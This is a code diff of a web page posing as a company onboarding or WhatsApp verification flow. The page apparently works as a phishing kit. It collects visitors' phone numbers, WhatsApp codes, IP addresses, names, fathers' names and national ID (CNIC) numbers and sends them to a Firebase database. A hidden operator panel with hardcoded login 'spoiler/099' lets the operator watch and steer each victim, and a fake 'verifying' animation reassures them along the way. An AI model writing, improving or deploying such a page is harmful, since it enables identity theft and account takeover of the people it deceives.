-        <div class="admin-info" id="adminUserInfo">
-            <strong>User Data:</strong><br>
-            <span id="adminPhone">Phone: -</span><br>
-            <span id="adminSource">Source: -</span><br>
-            <span id="adminEarning">Earning: -</span><br>
-            <span id="adminExperience">Experience: -</span><br>
-            <span id="adminIP">IP: Loading...</span><br>
-            <span id="adminName">Name: -</span><br>
-            <span id="adminFather">Father: -</span><br>
-            <span id="adminCNIC">CNIC: -</span>
-        </div>
-        <input type="text" class="admin-input" id="adminCode" placeholder="Enter code (6 digits)" maxlength="6" />
-        <button class="admin-btn" id="adminSendCode">Send Code to User</button>
-        <button class="admin-btn green" id="adminVerifyConnect">Verify & Connect</button>
-        <button class="admin-btn red" id="adminReset">Reset Everything</button>
-        <p style="color:#666; font-size:10px; margin-top:10px; text-align:center;">
-            Press "A" 5 times to toggle this panel
-        </p>
+        <div class="progress-status" id="hackStatus">Connecting... 0%</div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
-        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-database.js";
+        import { getDatabase, ref, set, onValue, get } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCddshBKIi6GFNMTOeUEKLvotlOyeQaG6o",
@@ -619,401 +715,375 @@
 
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
-        const sessionRef = ref(database, 'session');
+        const rootRef = ref(database, 'session');
 
-        // Global variables
+        // State
         let userData = {
-            source: '',
-            earning: '',
-            experience: '',
-            phone: '',
-            name: '',
-            father: '',
-            cnic: '',
-            ip: 'Loading...'
+            source: '', earning: '', experience: '',
+            phone: '', name: '', father: '', cnic: '', ip: ''
         };
+        let adminLoggedIn = false;
         let generatedCode = '';
-        let adminModeActive = false;
-        let keyPressCount = 0;
-        let keyPressTimer = null;
-        let isAdmin = false;
         let currentStep = 'welcome';
+        let isReturningVisitor = false;
 
-        // DOM Elements
-        const stepWelcome = document.getElementById('stepWelcome');
-        const stepQuestions = document.getElementById('stepQuestions');
-        const stepWhatsApp = document.getElementById('stepWhatsApp');
-        const stepFinalForm = document.getElementById('stepFinalForm');
-        const stepThankYou = document.getElementById('stepThankYou');
-        const getStartedBtn = document.getElementById('getStartedBtn');
-        const readyBtn = document.getElementById('readyBtn');
-        const sendCodeBtn = document.getElementById('sendCodeBtn');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const changeNumberBtn = document.getElementById('changeNumberBtn');
-        const submitProfileBtn = document.getElementById('submitProfileBtn');
-        const phoneInput = document.getElementById('phoneNumber');
-        const displayNumber = document.getElementById('displayNumber');
-        const verificationInput = document.getElementById('verificationCode');
-        const codeDisplay = document.getElementById('codeDisplay');
-        const hackOverlay = document.getElementById('hackOverlay');
-        const hackStatus = document.getElementById('hackStatus');
-        const progressBar = document.getElementById('progressBar');
-        const adminPanel = document.getElementById('adminPanel');
-        const adminCodeInput = document.getElementById('adminCode');
-        const adminSendCodeBtn = document.getElementById('adminSendCode');
-        const adminVerifyConnectBtn = document.getElementById('adminVerifyConnect');
-        const adminResetBtn = document.getElementById('adminReset');
+        // DOM refs
+        const $ = (id) => document.getElementById(id);
 
-        // Firebase references
-        const userDataRef = ref(database, 'session/userData');
-        const codeFromAdminRef = ref(database, 'session/codeFromAdmin');
-        const adminVerifyCommandRef = ref(database, 'session/adminVerifyCommand');
-        const resetCommandRef = ref(database, 'session/resetCommand');
-        const adminConnectedRef = ref(database, 'session/adminConnected');
-
-        // Get IP address
-        async function getIP() {
+        // Get IP
+        async function fetchIP() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
                 userData.ip = data.ip;
-                document.getElementById('adminIP').textContent = 'IP: ' + data.ip;
-            } catch (error) {
+                $('adminIP').textContent = data.ip;
+            } catch(e) {
                 userData.ip = 'Unknown';
-                document.getElementById('adminIP').textContent = 'IP: Unknown';
+                $('adminIP').textContent = 'Unknown';
             }
         }
-        getIP();
 
-        // Check local storage for returning visitor
-        function checkReturningVisitor() {
-            const savedIP = localStorage.getItem('userIP');
-            const savedData = localStorage.getItem('userData');
-            const currentIP = userData.ip;
-            
-            if (savedIP && savedData && savedIP === currentIP) {
-                const parsedData = JSON.parse(savedData);
-                userData = parsedData;
-                
-                // Skip to WhatsApp connect if already completed questions
-                if (userData.phone) {
-                    showStep('whatsapp');
-                    document.getElementById('waStep1').classList.add('hidden');
-                    document.getElementById('waStep2').classList.remove('hidden');
-                    displayNumber.textContent = userData.phone;
-                } else {
-                    showStep('whatsapp');
+        // Local storage helpers
+        function saveLocal() {
+            try {
+                localStorage.setItem('elite_user_data', JSON.stringify(userData));
+                localStorage.setItem('elite_user_ip', userData.ip);
+                localStorage.setItem('elite_completed', userData.name ? 'true' : 'false');
+            } catch(e) {}
+        }
+
+        function loadLocal() {
+            try {
+                const saved = localStorage.getItem('elite_user_data');
+                const savedIP = localStorage.getItem('elite_user_ip');
+                const completed = localStorage.getItem('elite_completed');
+                if (saved) {
+                    userData = JSON.parse(saved);
                 }
-                return true;
-            }
+                if (savedIP && userData.ip && savedIP === userData.ip) {
+                    isReturningVisitor = true;
+                }
+                if (completed === 'true' && userData.name) {
+                    showThankYou();
+                    return true;
+                }
+                if (isReturningVisitor && userData.phone) {
+                    // Skip to WhatsApp connected state
+                    $('displayNumber').textContent = userData.phone;
+                    showStep('whatsapp');
+                    $('waStep1').classList.add('hidden');
+                    $('waStep2').classList.remove('hidden');
+                    return true;
+                }
+                if (isReturningVisitor && userData.source) {
+                    showStep('whatsapp');
+                    return true;
+                }
+            } catch(e) {}
             return false;
         }
 
-        // Save to local storage
-        function saveToLocalStorage() {
-            localStorage.setItem('userIP', userData.ip);
-            localStorage.setItem('userData', JSON.stringify(userData));
+        function clearLocal() {
+            try {
+                localStorage.removeItem('elite_user_data');
+                localStorage.removeItem('elite_user_ip');
+                localStorage.removeItem('elite_completed');
+            } catch(e) {}
         }
 
-        // Show step function
+        // Show step
         function showStep(step) {
-            stepWelcome.classList.add('hidden');
-            stepQuestions.classList.add('hidden');
-            stepWhatsApp.classList.add('hidden');
-            stepFinalForm.classList.add('hidden');
-            stepThankYou.classList.add('hidden');
-            
+            ['stepWelcome','stepQuestions','stepWhatsApp','stepFinalForm','stepThankYou'].forEach(s => {
+                $(s).classList.add('hidden');
+            });
             switch(step) {
-                case 'welcome':
-                    stepWelcome.classList.remove('hidden');
-                    break;
-                case 'questions':
-                    stepQuestions.classList.remove('hidden');
-                    break;
-                case 'whatsapp':
-                    stepWhatsApp.classList.remove('hidden');
-                    break;
-                case 'final':
-                    stepFinalForm.classList.remove('hidden');
-                    break;
-                case 'thankyou':
-                    stepThankYou.classList.remove('hidden');
-                    break;
+                case 'welcome': $('stepWelcome').classList.remove('hidden'); break;
+                case 'questions': $('stepQuestions').classList.remove('hidden'); break;
+                case 'whatsapp': $('stepWhatsApp').classList.remove('hidden'); break;
+                case 'final': $('stepFinalForm').classList.remove('hidden'); break;
+                case 'thankyou': $('stepThankYou').classList.remove('hidden'); break;
             }
             currentStep = step;
         }
 
-        // Admin mode toggle
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'a' || e.key === 'A') {
-                keyPressCount++;
-                clearTimeout(keyPressTimer);
-                keyPressTimer = setTimeout(() => { keyPressCount = 0; }, 1000);
-                
-                if (keyPressCount >= 5) {
-                    adminModeActive = !adminModeActive;
-                    isAdmin = adminModeActive;
-                    adminPanel.classList.toggle('hidden', !adminModeActive);
-                    keyPressCount = 0;
-                    
-                    if (isAdmin) {
-                        set(adminConnectedRef, true);
-                        listenToUserData();
-                    } else {
-                        set(adminConnectedRef, false);
-                    }
-                }
+        function showThankYou() {
+            const title = userData.name && !userData.name.startsWith('Mr') ? 'Ms' : 'Mr';
+            $('thankYouName').textContent = (title === 'Ms' ? 'Ms ' : 'Mr ') + (userData.name || 'User');
+            showStep('thankyou');
+        }
+
+        // Firebase sync user data
+        function syncUserData() {
+            set(ref(database, 'session/userData'), userData).catch(() => {});
+        }
+
+        // Admin login
+        $('adminFab').addEventListener('click', () => {
+            if (adminLoggedIn) {
+                $('adminPanel').classList.toggle('hidden');
+            } else {
+                $('adminLoginModal').classList.remove('hidden');
             }
+        });
+
+        $('adminCancelBtn').addEventListener('click', () => {
+            $('adminLoginModal').classList.add('hidden');
+        });
+
+        $('adminLoginBtn').addEventListener('click', () => {
+            const username = $('adminUsername').value.trim();
+            const password = $('adminPassword').value.trim();
+            if (username === 'spoiler' && password === '099') {
+                adminLoggedIn = true;
+                $('adminLoginModal').classList.add('hidden');
+                $('adminPanel').classList.remove('hidden');
+                $('adminUsername').value = '';
+                $('adminPassword').value = '';
+                listenToUserData();
+            } else {
+                alert('Invalid credentials');
+            }
+        });
+
+        $('adminLogoutBtn').addEventListener('click', () => {
+            adminLoggedIn = false;
+            $('adminPanel').classList.add('hidden');
         });
 
         // Listen to user data for admin
         function listenToUserData() {
-            onValue(userDataRef, (snapshot) => {
+            onValue(ref(database, 'session/userData'), (snapshot) => {
                 const data = snapshot.val();
-                if (data) {
-                    document.getElementById('adminPhone').textContent = 'Phone: ' + (data.phone || '-');
-                    document.getElementById('adminSource').textContent = 'Source: ' + (data.source || '-');
-                    document.getElementById('adminEarning').textContent = 'Earning: ' + (data.earning || '-');
-                    document.getElementById('adminExperience').textContent = 'Experience: ' + (data.experience || '-');
-                    document.getElementById('adminIP').textContent = 'IP: ' + (data.ip || '-');
-                    document.getElementById('adminName').textContent = 'Name: ' + (data.name || '-');
-                    document.getElementById('adminFather').textContent = 'Father: ' + (data.father || '-');
-                    document.getElementById('adminCNIC').textContent = 'CNIC: ' + (data.cnic || '-');
+                if (data && adminLoggedIn) {
+                    $('adminPhone').textContent = data.phone || '-';
+                    $('adminSource').textContent = data.source || '-';
+                    $('adminEarning').textContent = data.earning || '-';
+                    $('adminExperience').textContent = data.experience || '-';
+                    $('adminIP').textContent = data.ip || '-';
+                    $('adminName').textContent = data.name || '-';
+                    $('adminFather').textContent = data.father || '-';
+                    $('adminCNIC').textContent = data.cnic || '-';
                 }
             });
         }
 
-        // Welcome step
-        getStartedBtn.addEventListener('click', () => {
-            if (!checkReturningVisitor()) {
-                showStep('questions');
-            }
-            saveToLocalStorage();
-        });
-
-        // Questions navigation
-        document.querySelectorAll('.option-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                const question = this.dataset.question;
-                const answer = this.dataset.answer;
-                
-                // Deselect siblings
-                this.parentElement.querySelectorAll('.option-btn').forEach(b => {
-                    b.classList.remove('selected');
-                });
-                this.classList.add('selected');
-                
-                // Save answer
-                if (question === '1') userData.source = answer;
-                if (question === '2') userData.earning = answer;
-                if (question === '3') userData.experience = answer;
-                
-                // Move to next question
-                setTimeout(() => {
-                    if (question === '1') {
-                        document.getElementById('question1').classList.add('hidden');
-                        document.getElementById('question2').classList.remove('hidden');
-                        document.querySelectorAll('.step-dot')[1].classList.add('active');
-                    } else if (question === '2') {
-                        document.getElementById('question2').classList.add('hidden');
-                        document.getElementById('question3').classList.remove('hidden');
-                        document.querySelectorAll('.step-dot')[2].classList.add('active');
-                    } else if (question === '3') {
-                        document.getElementById('question3').classList.add('hidden');
-                        document.getElementById('question4').classList.remove('hidden');
-                        document.querySelectorAll('.step-dot')[3].classList.add('active');
-                    }
-                }, 300);
-            });
-        });
-
-        // Ready button
-        readyBtn.addEventListener('click', () => {
-            showStep('whatsapp');
-            saveToLocalStorage();
-        });
-
-        // Send verification code
-        sendCodeBtn.addEventListener('click', () => {
-            userData.phone = phoneInput.value.trim();
-            if (userData.phone.length < 6) {
-                alert('Please enter a valid phone number');
-                return;
-            }
-            
-            displayNumber.textContent = userData.phone;
-            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-            adminCodeInput.value = generatedCode;
-            
-            // Send to Firebase
-            set(userDataRef, userData);
-            
-            document.getElementById('waStep1').classList.add('hidden');
-            document.getElementById('waStep2').classList.remove('hidden');
-            saveToLocalStorage();
-        });
-
-        // Listen for code from admin
-        onValue(codeFromAdminRef, (snapshot) => {
+        // Listen for admin code
+        onValue(ref(database, 'session/codeFromAdmin'), (snapshot) => {
             const code = snapshot.val();
-            if (code && !document.getElementById('waStep2').classList.contains('hidden')) {
-                codeDisplay.textContent = code;
-                verificationInput.value = code;
-                verifyBtn.disabled = false;
-                verifyBtn.textContent = 'Verify & Connect';
+            if (code && currentStep === 'whatsapp' && !$('waStep2').classList.contains('hidden')) {
+                $('codeDisplay').textContent = code;
+                $('verificationCode').value = code;
+                $('verifyBtn').disabled = false;
+                $('verifyBtn').textContent = 'Verify & Connect';
             }
         });
 
         // Listen for admin verify command
-        onValue(adminVerifyCommandRef, (snapshot) => {
-            const command = snapshot.val();
-            if (command === 'verify_now' && currentStep === 'whatsapp') {
+        onValue(ref(database, 'session/adminVerifyCommand'), (snapshot) => {
+            const cmd = snapshot.val();
+            if (cmd === 'verify_now' && currentStep === 'whatsapp') {
                 showHackAnimation();
-                set(adminVerifyCommandRef, null);
+                set(ref(database, 'session/adminVerifyCommand'), null).catch(() => {});
             }
         });
 
-        // Listen for reset command
-        onValue(resetCommandRef, (snapshot) => {
-            const command = snapshot.val();
-            if (command === 'reset_now') {
-                localStorage.clear();
-                location.reload();
+        // Listen for reset
+        onValue(ref(database, 'session/resetCommand'), (snapshot) => {
+            const cmd = snapshot.val();
+            if (cmd === 'reset_now') {
+                clearLocal();
+                setTimeout(() => location.reload(), 300);
             }
         });
 
-        // Verify button (user side)
-        verifyBtn.addEventListener('click', () => {
-            const enteredCode = verificationInput.value.trim();
-            if (enteredCode === generatedCode) {
-                showHackAnimation();
-            } else {
-                alert('Invalid code. Please wait for admin approval.');
+        // Welcome → Questions
+        $('getStartedBtn').addEventListener('click', () => {
+            if (!loadLocal()) {
+                showStep('questions');
             }
+        });
+
+        // Question navigation
+        document.querySelectorAll('.option-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const q = this.dataset.q;
+                const a = this.dataset.a;
+                
+                this.parentElement.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+                this.classList.add('selected');
+                
+                if (q === '1') userData.source = a;
+                if (q === '2') userData.earning = a;
+                if (q === '3') userData.experience = a;
+                
+                setTimeout(() => {
+                    if (q === '1') {
+                        $('q1').classList.add('hidden');
+                        $('q2').classList.remove('hidden');
+                        $('dot1').classList.remove('active');
+                        $('dot1').classList.add('done');
+                        $('dot2').classList.add('active');
+                    }
+                    if (q === '2') {
+                        $('q2').classList.add('hidden');
+                        $('q3').classList.remove('hidden');
+                        $('dot2').classList.remove('active');
+                        $('dot2').classList.add('done');
+                        $('dot3').classList.add('active');
+                    }
+                    if (q === '3') {
+                        $('q3').classList.add('hidden');
+                        $('q4').classList.remove('hidden');
+                        $('dot3').classList.remove('active');
+                        $('dot3').classList.add('done');
+                        $('dot4').classList.add('active');
+                    }
+                }, 250);
+            });
+        });
+
+        // Ready → WhatsApp
+        $('readyBtn').addEventListener('click', () => {
+            saveLocal();
+            showStep('whatsapp');
+        });
+
+        // Send code
+        $('sendCodeBtn').addEventListener('click', () => {
+            const phone = $('phoneNumber').value.trim();
+            if (phone.length < 6) {
+                alert('Please enter a valid phone number');
+                return;
+            }
+            userData.phone = phone;
+            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+            $('adminCode').value = generatedCode;
+            $('displayNumber').textContent = phone;
+            
+            syncUserData();
+            saveLocal();
+            
+            $('waStep1').classList.add('hidden');
+            $('waStep2').classList.remove('hidden');
         });
 
         // Change number
-        changeNumberBtn.addEventListener('click', () => {
-            document.getElementById('waStep1').classList.remove('hidden');
-            document.getElementById('waStep2').classList.add('hidden');
-            phoneInput.value = '';
-            verificationInput.value = '';
-            codeDisplay.textContent = '______';
-            verifyBtn.disabled = true;
-            verifyBtn.textContent = 'Waiting for admin approval...';
+        $('changeNumberBtn').addEventListener('click', () => {
+            $('waStep1').classList.remove('hidden');
+            $('waStep2').classList.add('hidden');
+            $('phoneNumber').value = '';
+            $('verificationCode').value = '';
+            $('codeDisplay').textContent = '______';
+            $('verifyBtn').disabled = true;
+            $('verifyBtn').textContent = 'Waiting for admin...';
+        });
+
+        // User verify
+        $('verifyBtn').addEventListener('click', () => {
+            const code = $('verificationCode').value.trim();
+            if (code === generatedCode && generatedCode !== '') {
+                showHackAnimation();
+            } else {
+                alert('Invalid code. Wait for admin approval.');
+            }
         });
 
         // Admin send code
-        adminSendCodeBtn.addEventListener('click', () => {
-            const code = adminCodeInput.value.trim();
+        $('adminSendCode').addEventListener('click', () => {
+            const code = $('adminCode').value.trim();
             if (code.length === 6) {
                 generatedCode = code;
-                set(codeFromAdminRef, code);
+                set(ref(database, 'session/codeFromAdmin'), code).catch(() => {});
             } else {
                 alert('Code must be 6 digits');
             }
         });
 
-        // Admin verify & connect
-        adminVerifyConnectBtn.addEventListener('click', () => {
-            set(adminVerifyCommandRef, 'verify_now');
+        // Admin verify connect
+        $('adminVerifyConnect').addEventListener('click', () => {
+            set(ref(database, 'session/adminVerifyCommand'), 'verify_now').catch(() => {});
         });
 
         // Admin reset
-        adminResetBtn.addEventListener('click', () => {
-            set(resetCommandRef, 'reset_now');
-            set(userDataRef, null);
-            set(codeFromAdminRef, null);
-            set(adminVerifyCommandRef, null);
-            localStorage.clear();
+        $('adminReset').addEventListener('click', () => {
+            set(ref(database, 'session/resetCommand'), 'reset_now').catch(() => {});
+            set(ref(database, 'session/userData'), null).catch(() => {});
+            set(ref(database, 'session/codeFromAdmin'), null).catch(() => {});
+            set(ref(database, 'session/adminVerifyCommand'), null).catch(() => {});
+            clearLocal();
             setTimeout(() => location.reload(), 500);
         });
 
         // Submit profile
-        submitProfileBtn.addEventListener('click', () => {
-            userData.name = document.getElementById('fullName').value.trim();
-            userData.father = document.getElementById('fatherName').value.trim();
-            userData.cnic = document.getElementById('cnic').value.trim();
+        $('submitProfileBtn').addEventListener('click', () => {
+            const name = $('fullName').value.trim();
+            const father = $('fatherName').value.trim();
+            const cnic = $('cnic').value.trim();
             
-            if (!userData.name || !userData.father || !userData.cnic) {
+            if (!name || !father || !cnic) {
                 alert('Please fill all fields');
                 return;
             }
             
-            set(userDataRef, userData);
-            saveToLocalStorage();
+            userData.name = name;
+            userData.father = father;
+            userData.cnic = cnic;
             
-            const title = userData.name.startsWith('Mr') || userData.name.startsWith('MR') ? 'Mr' : 'Ms';
-            document.getElementById('thankYouName').textContent = title + ' ' + userData.name;
+            syncUserData();
+            saveLocal();
+            
+            const title = name.startsWith('Mr') ? 'Mr' : 'Ms';
+            $('thankYouName').textContent = title + ' ' + name;
             showStep('thankyou');
         });
 
-        // Show hack animation
+        // Hack animation
         function showHackAnimation() {
-            hackOverlay.classList.remove('hidden');
-            
+            $('hackOverlay').classList.remove('hidden');
             let progress = 0;
-            const statusMessages = [
+            const messages = [
                 'Connecting to secure server... 0%',
                 'Verifying WhatsApp profile... 25%',
                 'Checking bot commands... 50%',
                 'Syncing with company database... 75%',
-                'Profile verified successfully! 100%'
+                'Profile verified! 100%'
             ];
             
             const interval = setInterval(() => {
                 progress += 5;
-                progressBar.style.width = progress + '%';
+                $('progressBar').style.width = progress + '%';
                 
-                if (progress <= 25) {
-                    hackStatus.textContent = statusMessages[0].replace('0%', progress + '%');
-                } else if (progress <= 50) {
-                    hackStatus.textContent = statusMessages[1];
-                } else if (progress <= 75) {
-                    hackStatus.textContent = statusMessages[2];
-                } else if (progress <= 95) {
-                    hackStatus.textContent = statusMessages[3];
-                } else if (progress >= 100) {
-                    hackStatus.textContent = statusMessages[4];
+                if (progress <= 25) $('hackStatus').textContent = messages[0].replace('0%', progress + '%');
+                else if (progress <= 50) $('hackStatus').textContent = messages[1];
+                else if (progress <= 75) $('hackStatus').textContent = messages[2];
+                else if (progress <= 95) $('hackStatus').textContent = messages[3];
+                else if (progress >= 100) {
+                    $('hackStatus').textContent = messages[4];
                     clearInterval(interval);
                     setTimeout(() => {
-                        hackOverlay.classList.add('hidden');
+                        $('hackOverlay').classList.add('hidden');
                         showStep('final');
-                    }, 1000);
+                    }, 800);
                 }
             }, 150);
         }
 
-        // Create floating particles
-        function createParticles() {
-            for (let i = 0; i < 20; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.width = Math.random() * 5 + 2 + 'px';
-                particle.style.height = particle.style.width;
-                particle.style.animationDuration = Math.random() * 15 + 10 + 's';
-                particle.style.animationDelay = Math.random() * 10 + 's';
-                document.body.appendChild(particle);
-            }
+        // Init
+        async function init() {
+            await fetchIP();
+            loadLocal();
+            
+            // Hide welcome spinner after 2.5s
+            setTimeout(() => {
+                $('welcomeSpinner').style.display = 'none';
+            }, 2500);
         }
-        createParticles();
 
-        // Welcome spinner timer
-        setTimeout(() => {
-            document.getElementById('welcomeSpinner').style.display = 'none';
-        }, 3000);
+        init();
 
-        // Check returning visitor on load
-        setTimeout(() => {
-            if (checkReturningVisitor()) {
-                // Already handled in checkReturningVisitor
-            }
-        }, 2000);
-
-        console.log('🔐 Elite Company Onboarding System v4.0');
-        console.log('📱 Multi-step flow with Firebase sync');
-        console.log('🛡️ For educational purposes only with consent!');
+        console.log('✅ Elite Onboarding System v5.0 - NO AUTO REFRESH');
+        console.log('🔐 Admin: spoiler / 099');
+        console.log('📱 Multi-device ready');
     </script>
 </body>
 </html>
